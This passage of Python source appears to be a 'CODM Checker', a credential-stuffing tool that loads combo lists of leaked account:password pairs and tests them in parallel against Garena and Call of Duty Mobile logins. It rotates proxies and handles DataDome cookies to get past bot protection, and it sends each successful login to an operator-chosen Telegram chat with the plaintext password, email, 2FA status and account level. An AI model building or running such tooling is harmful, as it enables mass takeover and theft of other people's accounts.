        clean_status = f"{Colors.GREEN}CLEAN{Colors.RESET}" if details.get('is_clean') else f"{Colors.RED}NOT CLEAN{Colors.RESET}"

        codm_nickname = codm_info.get('codm_nickname', 'N/A') if has_codm else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if has_codm else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if has_codm else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if has_codm else 'N/A'

        mess = f"""
{Colors.LIGHTGREEN_EX}[+] Garena Info{Colors.RESET}
      {Colors.CYAN}Username     :{Colors.RESET} {Colors.WHITE}{username}{Colors.RESET}
      {Colors.CYAN}Password     :{Colors.RESET} {Colors.WHITE}{password}{Colors.RESET}
      {Colors.CYAN}Garena Shell :{Colors.RESET} {Colors.YELLOW}{shell}{Colors.RESET}
{Colors.LIGHTGREEN_EX}[+] CODM Info{Colors.RESET}
      {Colors.CYAN}Nickname :{Colors.RESET} {Colors.WHITE}{codm_nickname}{Colors.RESET}
      {Colors.CYAN}UID      :{Colors.RESET} {Colors.WHITE}{codm_uid}{Colors.RESET}
      {Colors.CYAN}Level    :{Colors.RESET} {Colors.WHITE}{codm_level}{Colors.RESET}
      {Colors.CYAN}Region   :{Colors.RESET} {Colors.WHITE}{codm_region}{Colors.RESET}
{Colors.LIGHTGREEN_EX}[+] Security{Colors.RESET}
      {Colors.CYAN}Mobile No      :{Colors.RESET} {Colors.WHITE}{mobile_display}{Colors.RESET}
      {Colors.CYAN}Email          :{Colors.RESET} {Colors.WHITE}{email} ({email_ver}){Colors.RESET}
      {Colors.CYAN}Mobile Bound   :{Colors.RESET} {mobile_bound}
      {Colors.CYAN}Email Verified :{Colors.RESET} {email_verified_display}
      {Colors.CYAN}Authenticator  :{Colors.RESET} {authenticator_enabled}
      {Colors.CYAN}2FA Enabled    :{Colors.RESET} {two_step_enabled}
      {Colors.CYAN}Country        :{Colors.RESET} {Colors.WHITE}{acc_country}{Colors.RESET}
      {Colors.CYAN}Account Status :{Colors.RESET} {clean_status}

  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
  {Colors.WHITE}CODM Checker{Colors.RESET}
""".strip()

        if not BOT_MODE:
            print(mess)

        if BOT_MODE and telegram_config:
            try:
                _tg_token, _tg_chat, _tg_thresholds, _tg_mention, _tg_clean_filter = telegram_config
                if _tg_token and _tg_chat:
                    _level_ok = True
                    if _tg_thresholds:
                        _lvl_int = int(codm_level) if str(codm_level).isdigit() else 0
                        _level_ok = any(_lvl_int >= t for t in _tg_thresholds)
                    _clean_ok = True
                    if _tg_clean_filter and _tg_clean_filter != "both":
                        _is_clean = details.get('is_clean', False)
                        if _tg_clean_filter == "clean" and not _is_clean:
                            _clean_ok = False
                        elif _tg_clean_filter == "notclean" and _is_clean:
                            _clean_ok = False
                    if _level_ok and _clean_ok:
                        _clean_tag = "CLEAN" if details.get('is_clean') else "NOT CLEAN"
                        _mobile_tag = "Yes" if mobile and str(mobile).strip() else "No"
                        _email_ver_tag = "Yes" if email_verified_flag else "No"
                        _mention_str = f"\nUser: {_tg_mention}" if _tg_mention else ""
                        _tg_msg = (
                            f"[+] HIT FOUND!{_mention_str}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"Login: {account}:{password}\n"
                            f"Username: {username}\n"
                            f"Shells: {shell}\n"
                            f"Country: {acc_country}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"CODM Nickname: {codm_nickname}\n"
                            f"CODM UID: {codm_uid}\n"
                            f"Level: {codm_level}\n"
                            f"Region: {codm_region}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"Email: {email} ({email_ver})\n"
                            f"Mobile: {_mobile_tag}\n"
                            f"Email Verified: {_email_ver_tag}\n"
                            f"Authenticator: {authenticator_enabled}\n"
                            f"2FA: {two_step_enabled}\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n"
                            f"Status: {_clean_tag}"
                        )
                        send_telegram_message(_tg_token, _tg_chat, _tg_msg)
            except Exception:
                pass

        return ""

    except Exception as e:
        logger.error(f"      Unexpected error processing: {e}")
        live_stats.update_stats(valid=False)
        return ""

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            console.print(f"[cyan] NO DUPLICATES LINES FOUND {os.path.basename(file_path)}.[/cyan]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        console.print(f"[green][+] Successfully removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except FileNotFoundError:
        console.print(f"[red][ERROR] File not found: {file_path}[/red]")
        return False
    except Exception as e:
        console.print(f"[red][ERROR] Failed to remove duplicates from {os.path.basename(file_path)}: {e}[/red]")
        return False

def select_input_file():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    combo_folder = os.path.join(script_dir, "Combo")

    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

    if not os.path.exists(combo_folder):
        os.makedirs(combo_folder, exist_ok=True)
        print(f"{GREEN}Combo folder created{RESET}")
        sys.exit(0)

    txt_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]

    if not txt_files:
        print(f"{RED}No .txt files in Combo folder{RESET}")
        sys.exit(0)

    file_data = []

    for i, file in enumerate(txt_files):
        file_path = os.path.join(combo_folder, file)
        try:
            file_size_kb = os.path.getsize(file_path) / 1024
            size_display = f"{file_size_kb/1024:.1f} MB" if file_size_kb >= 1024 else f"{file_size_kb:.2f} KB"
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                line_count = sum(1 for line in f if line.strip())

            file_data.append({
                "index": i + 1,
                "filename": file,
                "size_kb": file_size_kb,
                "size_display": size_display,
                "lines": line_count
            })
        except Exception as e:
            print(f"{YELLOW}Could not read {file}: {e}{RESET}")
            continue

    if not file_data:
        print(f"{RED}No valid files found{RESET}")
        sys.exit(0)

    max_filename_len = max(len(item['filename']) for item in file_data)
    max_size_len = max(len(item['size_display']) for item in file_data)
    max_lines_len = max(len(f"{item['lines']:,}") for item in file_data)
    
    content_width = max(60, max_filename_len + max_size_len + max_lines_len + 25)
    
    def draw_box_top(width):
        return f"{CYAN}╔{'═' * width}╗{RESET}"
    
    def draw_box_bottom(width):
        return f"{CYAN}╚{'═' * width}╝{RESET}"
    
    def draw_box_separator(width):
        return f"{CYAN}╠{'═' * width}╣{RESET}"
    
    def draw_box_line(content, width):
        import re
        clean_content = re.sub(r'\033\[[0-9;]*m', '', content)
        padding = width - len(clean_content)
        return f"{CYAN}║{RESET} {content}{' ' * (padding - 1)}{CYAN}║{RESET}"

    print()
    print(draw_box_top(content_width))
    
    title = f"COMBO FILE SELECTOR"
    title_padding = (content_width - len(title)) // 2
    print(f"{CYAN}║{RESET}{' ' * title_padding}{BOLD}{YELLOW}{title}{RESET}{' ' * (content_width - title_padding - len(title))}{CYAN}║{RESET}")
    
    subtitle = f"CODM Checker"
    sub_padding = (content_width - len(subtitle)) // 2
    print(f"{CYAN}║{RESET}{' ' * sub_padding}{GRAY}{subtitle}{RESET}{' ' * (content_width - sub_padding - len(subtitle))}{CYAN}║{RESET}")
    
    print(draw_box_separator(content_width))
    
    header = f"  {WHITE}{'#':<4} {'FILE NAME':<{max_filename_len + 5}} {'SIZE':<{max_size_len + 5}} {'LINES':<{max_lines_len + 5}}{RESET}"
    print(draw_box_line(header, content_width))
    
    sep_line = f"  {GRAY}{'─' * 3}  {'─' * (max_filename_len + 3)}  {'─' * (max_size_len + 3)}  {'─' * (max_lines_len + 3)}{RESET}"
    print(draw_box_line(sep_line, content_width))
    
    for item in file_data:
        idx_str = f"{item['index']}."
        filename_str = item['filename']
        size_str = item['size_display']
        lines_str = f"{item['lines']:,}"
        
        if item['size_kb'] > 1024:
            size_color = GREEN
        elif item['size_kb'] > 100:
            size_color = YELLOW
        else:
            size_color = WHITE
        
        if item['lines'] > 10000:
            lines_color = GREEN
        elif item['lines'] > 1000:
            lines_color = YELLOW
        else:
            lines_color = WHITE
        
        row = f"  {CYAN}{idx_str:<4}{RESET} {WHITE}{filename_str:<{max_filename_len + 5}}{RESET} {size_color}{size_str:<{max_size_len + 5}}{RESET} {lines_color}{lines_str:<{max_lines_len + 5}}{RESET}"
        print(draw_box_line(row, content_width))
    
    print(draw_box_separator(content_width))
    
    total_files = len(file_data)
    total_lines = sum(item['lines'] for item in file_data)
    total_size_kb = sum(item['size_kb'] for item in file_data)
    total_size_str = f"{total_size_kb/1024:.1f} MB" if total_size_kb >= 1024 else f"{total_size_kb:.2f} KB"
    
    stats = f"  {GRAY}Total: {WHITE}{total_files}{GRAY} files  │  {WHITE}{total_lines:,}{GRAY} lines  │  {WHITE}{total_size_str}{RESET}"
    print(draw_box_line(stats, content_width))
    
    print(draw_box_bottom(content_width))
    print()

    if len(file_data) == 1:
        selected_file = file_data[0]
        print(f"{GREEN}Auto-selected: {WHITE}{selected_file['filename']}{RESET}")
    else:
        while True:
            try:
                prompt = f"{CYAN}Select file number (1-{len(file_data)}): {RESET}"
                choice = input(prompt).strip()
                
                if not choice:
                    selected_file = file_data[0]
                    break
                
                choice_idx = int(choice) - 1
                if 0 <= choice_idx < len(file_data):
                    selected_file = file_data[choice_idx]
                    break
                else:
                    print(f"{RED}    Invalid! Choose 1-{len(file_data)}{RESET}")
            except ValueError:
                print(f"{RED}    Enter a valid number{RESET}")
            except KeyboardInterrupt:
                print(f"\n{YELLOW}Cancelled by user{RESET}")
                sys.exit(0)
    
    file_path = os.path.join(combo_folder, selected_file["filename"])
    
    print()
    try:
        dup_prompt = f"{CYAN}Remove duplicates? (y/N): {RESET}"
        if input(dup_prompt).strip().lower() == 'y':
            remove_duplicates_from_file(file_path)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Skipped{RESET}")
    
    print()
    print(f"{CYAN}╔{'═' * 50}╗{RESET}")
    print(f"{CYAN}║{RESET}  {GREEN}SELECTED FILE{RESET}{' ' * 33}{CYAN}║{RESET}")
    print(f"{CYAN}╠{'═' * 50}╣{RESET}")
    print(f"{CYAN}║{RESET}  {WHITE}Name : {YELLOW}{selected_file['filename']:<40}{RESET} {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {WHITE}Size : {GREEN}{selected_file['size_display']:<40}{RESET} {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET}  {WHITE}Lines: {MAGENTA}{selected_file['lines']:,}{' ' * (40 - len(f'{selected_file['lines']:,}'))}{RESET} {CYAN}║{RESET}")
    print(f"{CYAN}╚{'═' * 50}╝{RESET}")
    print()
    
    return file_path

import time
from colorama import Fore, Style, init

init(autoreset=True)

W    = '\033[0m'
GR   = '\033[90m'
R    = '\033[1;31m'
RED  = '\033[101m'
B    = '\033[0;34m\033[1m'
CY = Fore.CYAN

telegram_enabled = False

def load_telegram_config():
    config_file = 'telegram_config.json'
    if os.path.exists(config_file):
        with open(config_file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return None

def save_telegram_config(config):
    config_file = 'telegram_config.json'
    with open(config_file, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2)

def send_telegram_message(bot_token, chat_id, message, parse_mode='HTML'):
    try:
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        data = {'chat_id': chat_id, 'text': message, 'parse_mode': parse_mode}
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            return response.json().get('result', {}).get('message_id')
        return None
    except Exception:
        return None

def delete_telegram_message(bot_token, chat_id, message_id, delay=5):
    if not message_id:
        return
    try:
        time.sleep(delay)
        url = f'https://api.telegram.org/bot{bot_token}/deleteMessage'
        requests.post(url, data={'chat_id': chat_id, 'message_id': message_id}, timeout=10)
    except Exception:
        pass

def send_and_delete(bot_token, chat_id, message, delay=20, parse_mode='HTML'):
    def _do():
        msg_id = send_telegram_message(bot_token, chat_id, message, parse_mode)
        if msg_id:
            delete_telegram_message(bot_token, chat_id, msg_id, delay=delay)
    threading.Thread(target=_do, daemon=True).start()

def setup_telegram():
    from rich.prompt import Confirm, Prompt
    from rich import box as rbox
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.align import Align

    console.print()
    console.print(Panel(Align.center(Text('Telegram Hits Config', style='bold cyan')),
                        border_style='cyan', box=rbox.ROUNDED, width=80))

    existing = load_telegram_config()
    _CF_MAP = {'clean': 'CLEAN only', 'notclean': 'NOT CLEAN only', 'both': 'BOTH'}
    if existing:
        console.print(Panel(
            f"[green]Found existing configuration[/green]\n"
            f"[yellow]Bot Token:[/yellow] [dim]...{existing['bot_token'][-10:]}[/dim]\n"
            f"[yellow]Chat ID:[/yellow] [white]{existing.get('chat_id','N/A')}[/white]\n"
            f"[yellow]Level Threshold:[/yellow] [white]{', '.join(f'{t}+' for t in (existing.get('level_threshold',[100]) if isinstance(existing.get('level_threshold',[100]), list) else [existing.get('level_threshold',100)]))}[/white]\n"
            f"[yellow]Notify for:[/yellow] [white]{_CF_MAP.get(existing.get('clean_filter','both'),'BOTH')}[/white]\n"
            f"[yellow]Mention:[/yellow] [white]{existing.get('mention_username','None')}[/white]",
            title='[bold green]Current Config[/bold green]', border_style='green', width=80
        ))
        if Confirm.ask('[bold cyan]Use existing configuration?[/bold cyan]'):
            raw = existing.get('level_threshold', [100])
            thr = raw if isinstance(raw, list) else [raw]
            return (existing['bot_token'], existing['chat_id'],
                    thr, existing.get('mention_username', ''),
                    existing.get('clean_filter', 'both'))

    console.print(Panel(
        '[dim]1. Message @BotFather -> /newbot\n'
        '2. Add bot to your group/channel as admin\n'
        '3. Get Chat ID via @userinfobot or use -100xxxxxxxxxx[/dim]',
        title='[bold blue]Setup Instructions[/bold blue]', border_style='blue', width=80
    ))

    bot_token = Prompt.ask('[bold cyan]Bot Token[/bold cyan]').strip()
    chat_id = Prompt.ask('[bold cyan]Chat/Channel ID[/bold cyan]').strip()

    console.print(Panel(
        '[bold yellow]Select level(s) to get notified for:[/bold yellow]\n'
        '[dim]You can pick multiple type numbers separated by comma (e.g. 3,4)[/dim]',
        border_style='yellow', width=80))
    tbl = Table(show_header=False, box=rbox.SIMPLE, width=36)
    tbl.add_column('', style='bold white', width=4)
    tbl.add_column('', style='dim white')
    level_map = {'1': 100, '2': 200, '3': 300, '4': 400, '5': 1}
    level_labels = {'1':'Level 100+','2':'Level 200+','3':'Level 300+','4':'Level 400+','5':'ALL levels'}
    for k, v in level_labels.items():
        tbl.add_row(f'[{k}]', v)
    console.print(tbl)

    while True:
        lc_raw = Prompt.ask('[bold cyan]Choose level(s) separate with comma if multiple (e.g. 3,4)[/bold cyan]', default='1').strip()
        lc_choices = [x.strip() for x in lc_raw.split(',') if x.strip() in level_map]
        if lc_choices:
            break
        console.print('[red]Invalid choice use numbers 1-5[/red]')

    if '5' in lc_choices:
        thresholds = [1]
    else:
        thresholds = sorted(set(level_map[k] for k in lc_choices))

    thresh_display = 'ALL' if thresholds == [1] else ', '.join(f'{t}+' for t in thresholds)
    threshold = thresholds

    mention = Prompt.ask(
        '[bold cyan]Your Telegram username to mention on IP block (e.g. @yourname, or leave blank)[/bold cyan]',
        default=''
    ).strip()

    console.print(Panel(
        '[bold yellow]Which accounts should trigger a Telegram notification?[/bold yellow]',
        border_style='yellow', width=80))
    ctbl = Table(show_header=False, box=rbox.SIMPLE, width=30)
    ctbl.add_column('', style='bold white', width=4)
    ctbl.add_column('', style='dim white')
    ctbl.add_row('[1]', 'CLEAN only')
    ctbl.add_row('[2]', 'NOT CLEAN only')
    ctbl.add_row('[3]', 'BOTH (all hits)')
    console.print(ctbl)
    clean_choice = Prompt.ask('[bold cyan]Choose[/bold cyan]', choices=['1','2','3'], default='3')
    clean_filter = {'1': 'clean', '2': 'notclean', '3': 'both'}[clean_choice]
    clean_filter_display = {'clean': 'CLEAN only', 'notclean': 'NOT CLEAN only', 'both': 'BOTH'}[clean_filter]

    test_msg = (f'[+] Test Message\n\n'
                f'Bot is working!\n'
                f'Level threshold: {thresh_display}\n'
                f'Notify for: {clean_filter_display}\n'
                f'Ready to receive hits!')
    console.print(Panel('[yellow]Testing...[/yellow]', border_style='yellow', width=80))

    if send_telegram_message(bot_token, chat_id, test_msg):
        console.print(Panel('[bold green]Test message sent! Check your Telegram.[/bold green]',
                            border_style='green', width=80))
        config = {
            'bot_token': bot_token, 'chat_id': chat_id,
            'level_threshold': thresholds, 'mention_username': mention,
            'clean_filter': clean_filter, 'enabled': True
        }
        if Confirm.ask('[bold green]Save configuration?[/bold green]'):
            save_telegram_config(config)
            console.print(Panel('[bold green]Saved![/bold green]', border_style='green', width=80))
        return (bot_token, chat_id, thresholds, mention, clean_filter)
    else:
        console.print(Panel('[bold red]Failed check bot token and chat ID[/bold red]',
                            border_style='red', width=80))
        return (None, None, None, None, None)


def print_banner():
    lines = [
        f'{W}',
        f'{W}{B}[{R}*{W}] {CY}{Style.BRIGHT}CODM CHECKER{Style.RESET_ALL} {B}[{R}*{W}]',
        f'{W}{GR}                          :::!~!!!!!:.',
        f'{W}{GR}                     .xUHWH!! !!?M88WHX:.',
        f'{W}{GR}                  .X*#M@$!  !X!M$$$$$WWx:',
        f'{W}{GR}                  :!!!!!!?H! :!$!$$$$$$$$8X:',
        f'{W}{GR}                :!~::!H![   ~.U$X!?W$$$$MM!',
        f'{W}{GR}                  ~!~!!!!~~ .:XW$$$U!!?$WMM!',
        f'{W}{GR}               !:~~~ .:!M*T#$$$WX??#MRRMMM!',
        f'{W}{GR}               ~?WuxiW*     *#$$$8!!!!??!!!',
        f"{W}{GR}             :X- M$$$$  {R}  *{GR}  '#T#$~!8$WUXU~",
        f"{W}{GR}          :%'  ~%$Mm:         ~!~ ?$$$$$",
        f'{W}{GR}          :! .-   ~T$8xx.  .xWW- ~""##*\'\'',
        f"{W}{GR}  .....   -~~:<  !    ~?T$@@W@*?$ {R} * {GR} /'",
        f"{W}{GR} W$@@M!!! .!~~ !!     .:XUW$W!~ '*~:   :",
        f"{W}{GR} %^~~'.:x%'!!  !H:   !WM$$$$Ti.: .!WUnn!",
        f'{W}{GR} :::~:!. :X~ .: ?H.!u $$$$$$!W:U!T$M~',
        f"{W}{GR} .~~   :X@!.-~   ?@WTWo('*$W$TH$!",
        f'{W}{GR} Wi.~!X$?!-~    : ?$$$B$Wu(***$RM!',
        f'{W}{GR} $R@i.#~ !     :   -$$$$$%$Mm$;',
        f'{W}{GR} ?MXT@Wx.~    :     ~##$$$M~',
        f'{W} ',
        f'\033[1m{R}{W}{RED}{B} {W}{RED} Garena CODM Checker {B} {W}{R}\033[0m'
    ]

    for line in lines:
        print(line)
        time.sleep(0.01)
    print()

def create_thread_session(cookie_manager, datadome_manager):
    sess = cloudscraper.create_scraper()
    sess.proxies.update(geo_rotator.get_proxies())
    valid_cookies = cookie_manager.get_valid_cookies()
    if valid_cookies:
        combined_cookie_str = "; ".join(valid_cookies)
        applyck(sess, combined_cookie_str)
        final_cookie_value = valid_cookies[-1]
        datadome_value = (
            final_cookie_value.split('=', 1)[1].strip()
            if '=' in final_cookie_value and len(final_cookie_value.split('=', 1)) > 1
            else None
        )
        if datadome_value:
            datadome_manager.set_datadome(datadome_value)
    else:
        datadome = get_datadome_cookie(sess)
        if datadome:
            datadome_manager.set_datadome(datadome)
    return sess


def main():
    print_banner()
    filename = select_input_file()
    
    if not os.path.exists(filename):
        console.print(f"[red]File not found: {filename}[/red]")
        return
    
    base_filename = os.path.splitext(os.path.basename(filename))[0]
    result_folder = f"{base_filename}_results"
    
    console.print(f"[cyan]Results folder: {result_folder}/[/cyan]")
    os.makedirs(result_folder, exist_ok=True)
    
    auto_remove_choice = console.input("[cyan]Auto-remove checked lines? (y/N): [/cyan]").strip().lower()
    AUTO_REMOVE_CHECKED = auto_remove_choice == "y"

    try:
        thread_input = console.input("[cyan]Threads (1-50, default 5): [/cyan]").strip()
        MAX_THREADS = max(1, min(50, int(thread_input))) if thread_input.isdigit() else 5
    except Exception:
        MAX_THREADS = 5
    console.print(f"[green]Using {MAX_THREADS} threads[/green]")

    console.print()

    tg_result = setup_telegram()
    tg_token, tg_chat, tg_threshold, tg_mention, tg_clean_filter = tg_result if tg_result[0] else (None, None, None, None, None)
    telegram_config = (tg_token, tg_chat, tg_threshold, tg_mention, tg_clean_filter) if tg_token else None

    console.print()
    
    cookie_manager = CookieManager()
    live_stats     = LiveStats()
    print_lock     = threading.Lock()
    file_lock      = threading.Lock()

    shared_datadome_manager = DataDomeManager()

    logger.info(f"[GEO] Proxy rotator active -> {geo_rotator.current_proxy} ({geo_rotator.total} proxies) | Folder: ./{PROXY_FOLDER}/")

    accounts = []
    encodings_to_try = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    for encoding in encodings_to_try:
        try:
            with open(filename, 'r', encoding=encoding) as file:
                accounts = [line.strip() for line in file if line.strip() and not line.startswith('===')]
            console.print(f"[green]File loaded ({encoding})[/green]")
            break
        except UnicodeDecodeError:
            continue
        except Exception:
            continue

    if not accounts:
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                accounts = [line.strip() for line in file if line.strip() and not line.startswith('===')]
            console.print(f"[green]File loaded with fallback encoding[/green]")
        except Exception as e:
            console.print(f"[red]Could not read file: {e}[/red]")
            return

    if not accounts:
        console.print(f"[red]No valid accounts found[/red]")
        return

    total_accounts = len(accounts)
    console.print(f"[cyan]Processing {total_accounts} accounts with {MAX_THREADS} threads...[/cyan]\n")
    console.print(f"[cyan]{'─' * 75}[/cyan]\n")

    thread_local = threading.local()
    thread_init_lock = threading.Lock()

    def get_thread_session():
        if not hasattr(thread_local, 'session'):
            with thread_init_lock:
                time.sleep(0.3)
            dm = DataDomeManager()
            thread_local.session = create_thread_session(cookie_manager, dm)
            thread_local.datadome_manager = dm
            thread_local.session.proxies.update(geo_rotator.get_proxies())
        else:
            thread_local.session.proxies.update(geo_rotator.get_proxies())
        return thread_local.session, thread_local.datadome_manager

    completed = [0]

    def process_one(idx_line):
        i, account_line = idx_line
        if ':' not in account_line:
            return

        try:
            account, password = account_line.split(':', 1)
            account  = account.strip()
            password = password.strip()

            sess, dm = get_thread_session()

            with print_lock:
                console.print(f"[bold cyan][{i}/{total_accounts}] Processing: {account}[/bold cyan]")

            result = processaccount(
                sess, account, password,
                cookie_manager, dm, live_stats,
                result_folder, telegram_config=telegram_config
            )

            with print_lock:
                if result:
                    print(result)
                print(f"\n  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}\n")
                completed[0] += 1
                if live_stats.should_display():
                    print(live_stats.display_stats(), flush=True)

            if AUTO_REMOVE_CHECKED:
                with file_lock:
                    try:
                        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                            remain = [ln for ln in f if ln.strip() != account_line.strip()]
                        with open(filename, "w", encoding="utf-8") as f:
                            for r in remain:
                                f.write(r if r.endswith("\n") else r + "\n")
                    except Exception:
                        pass

        except Exception as e:
            with print_lock:
                console.print(f"[red]Failed to process line {i}: {e}[/red]")

    indexed = list(enumerate(accounts, 1))
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(process_one, item): item for item in indexed}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                with print_lock:
                    console.print(f"[red]Thread error: {e}[/red]")

    final_stats = live_stats.get_stats()
    
    console.print(f"\n[cyan]{'═' * 75}[/cyan]")
    console.print(f"[bold bright_cyan]FINAL STATISTICS REPORT[/bold bright_cyan]")
    console.print(f"[cyan]{'═' * 75}[/cyan]")
    console.print(f"[green]Valid:[/green] {final_stats['valid']:>6}  [cyan]│[/cyan]  [red]Invalid:[/red] {final_stats['invalid']:>6}")
    console.print(f"[green]Clean:[/green] {final_stats['clean']:>6}  [cyan]│[/cyan]  [yellow]Not Clean:[/yellow] {final_stats['not_clean']:>6}")
    console.print(f"[blue]Has CODM:[/blue] {final_stats['has_codm']:>3}  [cyan]│[/cyan]  [red]No CODM:[/red] {final_stats['no_codm']:>6}")
    console.print(f"[cyan]{'═' * 75}[/cyan]")
    console.print(f"[cyan]Results saved to: {result_folder}/[/cyan]\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print(f"\n[yellow]Script terminated by user[/yellow]")
    except Exception as e:
        console.print(f"[red]Unexpected error: {e}[/red]")
